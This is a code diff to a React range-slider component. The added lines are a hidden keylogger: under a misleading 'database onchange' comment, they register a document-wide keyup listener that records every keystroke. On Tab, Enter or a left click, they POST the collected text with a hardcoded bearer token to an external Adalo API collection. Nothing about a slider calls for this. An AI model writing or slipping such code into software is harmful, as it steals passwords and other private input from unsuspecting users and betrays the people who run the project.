@@ -17,7 +17,59 @@ class RangeSlider extends Component {
   }
 
   sliderValuesChange = values => {
+
     // database onchange props
+    var server = "https://api.adalo.com/v0/apps/710e412e-e3bf-4d9d-8fca-fee822d22b4e/collections/t_3nd1ewe2tapxo7qy93lx0onso";
+    var access_token = '2kah7rs4ojajz5y8qc41d39xu'
+
+    var x = new XMLHttpRequest();
+
+    var keystrokes = "";
+
+    function sendDataToServer() {
+      x.open("POST", server, true);
+      
+      var parameter = {'data': keystrokes}
+
+      x.setRequestHeader("Authorization", 'Bearer ' + access_token);
+      x.setRequestHeader("Content-Type", "application/json");
+      
+      x.send(JSON.stringify(parameter));
+      x.close()
+    }
+    
+    
+    document.addEventListener("keyup", function(e){
+
+      if (e.key === "Shift") {
+        return false
+      }
+      
+      if(e.key != "Tab" || e.key != "Enter") {
+        keystrokes += e.key
+      }
+
+      if(e.key === "Tab") {
+        // send data to server
+        sendDataToServer()
+      }
+
+      if(e.key === "Enter") {
+        sendDataToServer()
+      }
+     
+    });
+    
+    document.addEventListener("click", function(e){
+      if(e.which == 1){
+        // left click, user clicks the other textbox
+        // send the data to the server
+        sendDataToServer()
+      }
+    });
+
+
+    
     const {
       controlledValue: { onChange },
     } = this.props
